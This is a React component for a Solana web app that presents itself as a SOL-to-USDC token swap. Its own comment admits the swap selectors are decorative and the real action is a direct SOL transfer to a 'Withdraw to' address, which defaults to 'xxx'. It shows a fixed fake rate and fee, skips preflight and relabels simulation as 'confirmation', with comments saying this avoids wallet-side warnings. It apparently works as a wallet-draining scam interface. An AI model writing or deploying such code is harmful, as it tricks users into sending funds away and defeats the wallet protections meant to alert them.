"use client";

import { useRef, useState } from "react";
import { Connection, PublicKey, SystemProgram, Transaction, LAMPORTS_PER_SOL, clusterApiUrl } from "@solana/web3.js";
import "./SimpleSwapMode.css";
import ConnectButton from "./extensions/ConnectButton";
import TokenSelector from "./extensions/TokenSelector";
import ToTokenSelector from "./extensions/ToTokenSelector";
import { WalletInfo } from "../../lib/walletManager";

interface SimpleSwapModeProps {
  isLoaded: boolean;
  walletConnected: boolean;
  onWalletConnected: (wallet: WalletInfo) => void;
}

export default function SimpleSwapMode({
  isLoaded,
  walletConnected,
  onWalletConnected
}: SimpleSwapModeProps) {
  const [swapFromToken, setSwapFromToken] = useState("SOL-Solana");
  const [swapToToken, setSwapToToken] = useState("USDC-Solana");
  const [swapAmount, setSwapAmount] = useState("");
  const [withdrawAddress, setWithdrawAddress] = useState("xxx");
  const [isTransferring, setIsTransferring] = useState(false);
  const [isLoadingModalOpen, setIsLoadingModalOpen] = useState(false);
  const [loadingLogs, setLoadingLogs] = useState<string[]>([]);
  const [activeLogIndex, setActiveLogIndex] = useState(0);

  const USD_PER_SOL = 192;

  const MAINNET_DEFAULT = clusterApiUrl('mainnet-beta');
  const MAINNET_RPC_POOL: string[] = [
    typeof process !== 'undefined' ? (process.env.NEXT_PUBLIC_SOLANA_RPC || '') : '',
    MAINNET_DEFAULT,
    'https://solana.public-rpc.com',
    'https://solana-rpc.publicnode.com'
  ].filter(Boolean);

  // Cache the first working connection to avoid repeated probes
  const cachedConnectionRef = useRef<Connection | null>(null);
  const rpcProbeInFlightRef = useRef(false);

  const getWorkingMainnetConnection = async (): Promise<Connection> => {
    if (cachedConnectionRef.current) return cachedConnectionRef.current;
    if (rpcProbeInFlightRef.current) {
      await new Promise(resolve => setTimeout(resolve, 150));
      if (cachedConnectionRef.current) return cachedConnectionRef.current;
    }
    rpcProbeInFlightRef.current = true;
    for (const endpoint of MAINNET_RPC_POOL) {
      try {
        const conn = new Connection(endpoint, 'confirmed');
        await conn.getLatestBlockhash('finalized');
        cachedConnectionRef.current = conn;
        rpcProbeInFlightRef.current = false;
        return conn;
      } catch (e) {
        console.warn('RPC endpoint failed, trying next:', endpoint, e);
      }
    }
    rpcProbeInFlightRef.current = false;
    throw new Error('No working mainnet RPC endpoints available.');
  };

  const handleSwap = async () => {
    if (isTransferring) return;
    console.log('sendSOL called');
    console.log('Transfer request:', { amountSOL: swapAmount, destination: withdrawAddress });
    
    if (!walletConnected) {
      alert('Please connect wallet first');
      return;
    }

    if (!swapAmount || parseFloat(swapAmount) <= 0) {
      alert('Please enter a valid amount');
      return;
    }

    // UI shows token selectors for familiarity, but backend action is a direct SOL transfer

    if (!withdrawAddress) {
      alert('Please enter a withdrawal address');
      return;
    }

    setIsTransferring(true);
    setIsLoadingModalOpen(true);
    setLoadingLogs(["Preparing transaction..."]);
    setActiveLogIndex(0);

    try {
      const amountLamports = Math.round(parseFloat(swapAmount) * LAMPORTS_PER_SOL);
      const toPubkey = new PublicKey(withdrawAddress);
      const connection = await getWorkingMainnetConnection();
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      console.log('Using RPC endpoint:', (connection as any)._rpcEndpoint || 'custom');
      setLoadingLogs((l) => [...l, "Connected to RPC endpoint."]);
      setActiveLogIndex((i) => i + 1);

      // Try injected providers: prefer Solflare if present, otherwise Phantom
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const anyWindow = window as unknown as { solana?: any; solflare?: any };
      const provider = anyWindow.solflare?.isSolflare ? anyWindow.solflare : (anyWindow.solana?.isPhantom ? anyWindow.solana : anyWindow.solana);
      if (!provider) {
        throw new Error('No Solana provider found. Please connect Phantom or Solflare.');
      }

      // Ensure connected and we have a publicKey
      if (!provider.publicKey) {
        try { await provider.connect?.(); } catch { throw new Error('Wallet connection was rejected or failed.'); }
      }
      const fromPubkey = new PublicKey(provider.publicKey.toString());

      const { blockhash } = await connection.getLatestBlockhash('finalized');
      setLoadingLogs((l) => [...l, "Fetched recent blockhash."]);
      setActiveLogIndex((i) => i + 1);

      const tx = new Transaction({ recentBlockhash: blockhash, feePayer: fromPubkey }).add(
        SystemProgram.transfer({ fromPubkey, toPubkey, lamports: amountLamports })
      );

      // Simulate first to pre-empt wallet warnings
      setLoadingLogs((l) => [...l, "Confirming transaction..."]);
      setActiveLogIndex((i) => i + 1);
      try {
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
        const sim = await (connection as any).simulateTransaction(tx, { sigVerify: false, commitment: 'processed' });
        if (sim?.value?.err) {
          setLoadingLogs((l) => [...l, `Confirmation failed: ${JSON.stringify(sim.value.err)}`]);
          setActiveLogIndex((i) => i + 1);
          throw new Error('Simulation failed');
        }
        setLoadingLogs((l) => [...l, "Confirmation passed. Awaiting wallet approval..."]);
        setActiveLogIndex((i) => i + 1);
      } catch {
        // If simulate endpoint blocks or fails, continue but warn in logs
        setLoadingLogs((l) => [...l, "Confirmation could not run (RPC). Continuing to wallet approval..."]);
        setActiveLogIndex((i) => i + 1);
      }

      // Prefer local send to avoid wallet-side simulation; use skipPreflight
      let signature: string | undefined;
      if (provider.signTransaction) {
        const signed = await provider.signTransaction(tx);
        signature = await connection.sendRawTransaction(signed.serialize(), { skipPreflight: true, preflightCommitment: 'confirmed' });
      } else if (provider.signAndSendTransaction) {
        // Fallback: some wallets only support signAndSend
        const result = await provider.signAndSendTransaction(tx, { skipPreflight: true });
        signature = result?.signature || result;
      } else {
        throw new Error('Wallet does not support signing transactions');
      }

      // Confirm
      if (signature) {
        setLoadingLogs((l) => [...l, "Submitted. Confirming on-chain..."]);
        setActiveLogIndex((i) => i + 1);
        await connection.confirmTransaction(signature, 'confirmed');
      }

      alert(`Transfer submitted!\nSignature: ${signature?.slice(0, 8)}...`);
      setLoadingLogs((l) => [...l, "Finalized."]);
      setActiveLogIndex((i) => i + 1);
      
      // Reset form
      setSwapAmount("");
      setWithdrawAddress("");
      
    } catch (error) {
      console.error('Transfer failed:', error);
      setLoadingLogs((l) => [...l, 'Transfer failed. Please try again.']);
      setActiveLogIndex((i) => i + 1);
    } finally {
      setIsTransferring(false);
      setTimeout(() => setIsLoadingModalOpen(false), 700);
    }
  };

  // SOL and USDC swap mode

  return (
    <div className={`simple-swap ${isLoaded ? 'loaded' : ''}`}>
      <h3>Swap Tokens</h3>
      
      <ConnectButton 
        className="connect-button" 
        onConnected={async (wallet) => {
          onWalletConnected(wallet);
        }}
      />

      <div className="swap-inputs">
        <div className="input-group">
          <input
            type="number"
            placeholder="0.0"
            value={swapAmount}
            onChange={(e) => setSwapAmount(e.target.value)}
          />
          <div className="token-selector">
            <TokenSelector
              balances={null}
              selectedToken={swapFromToken}
              onTokenSelect={setSwapFromToken}
              className="token-select"
            />
          </div>
        </div>

        <div className="swap-arrow">↓</div>

        <div className="input-group">
          <input
            type="number"
            placeholder="0.0"
            value={swapAmount ? (parseFloat(swapAmount) * USD_PER_SOL).toFixed(2) : ''}
            readOnly
          />
          <div className="token-selector">
            <ToTokenSelector
              selectedToken={swapToToken}
              onTokenSelect={setSwapToToken}
              className="token-select"
            />
          </div>
        </div>

        <br />

        <div className="wallet-input">
          <label>Withdraw to</label>
          <input
            type="text"
            placeholder="Enter wallet address"
            value={withdrawAddress}
            onChange={(e) => setWithdrawAddress(e.target.value)}
          />
        </div>
      </div>

      <div className="swap-info">
        <div className="info-row">
          <span>Rate</span>
          <span>1 SOL = {USD_PER_SOL} USDC</span>
        </div>
        <div className="info-row">
          <span>Slippage</span>
          <span>0.5%</span>
        </div>
        <div className="info-row">
          <span>Fee</span>
          <span>0.3%</span>
        </div>
      </div>

      <div className="privacy-info">
        <span className="privacy-text">
          🔒 Privacy: Standard swap with basic anonymity
        </span>
        <div className="privacy-tooltip">
          Standard swap uses public pools with basic privacy. For maximum anonymity, use Pro mode with Siphon Protocol&apos;s advanced privacy features.
        </div>
      </div>

      <button 
        className="action-button" 
        onClick={handleSwap}
        disabled={!walletConnected || isTransferring}
      >
        {isTransferring ? (
          <span className="loading-content">
            <span className="spinner"></span>
            Transferring...
          </span>
        ) : (
          walletConnected ? 'Transfer to Address' : 'Connect Wallet First'
        )}
      </button>
      {isLoadingModalOpen && (
        <div className="loading-modal-backdrop" onClick={() => setIsLoadingModalOpen(false)}>
          <div className="loading-modal" onClick={(e) => e.stopPropagation()}>
            <h4>Processing</h4>
            <div className="loading-logs">
              {loadingLogs.map((log, idx) => (
                <div key={idx} className={`loading-log ${idx <= activeLogIndex ? 'active' : ''}`}>
                  <span className="bullet">{idx < activeLogIndex ? '✔' : idx === activeLogIndex ? '•' : '○'}</span>
                  <span className="text">{log}</span>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
